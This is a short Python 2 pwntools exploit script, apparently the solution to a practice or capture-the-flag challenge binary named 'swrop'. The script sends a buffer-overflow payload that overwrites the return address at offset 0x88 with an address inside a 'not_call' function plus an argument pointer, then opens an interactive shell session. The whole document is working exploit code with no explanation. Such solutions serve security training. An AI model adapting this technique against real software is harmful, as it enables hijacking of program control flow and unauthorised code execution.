#!/usr/bin/env python2

from pwn import *

p = process('./swrop')

e = p.elf

p.recvuntil('> ', drop=True)

payload = fit({
    0x84+4: e.symbols['not_call'] + 23,
    0x84+8: p32(0x80485f0)
})

p.sendline(payload)

p.interactive()
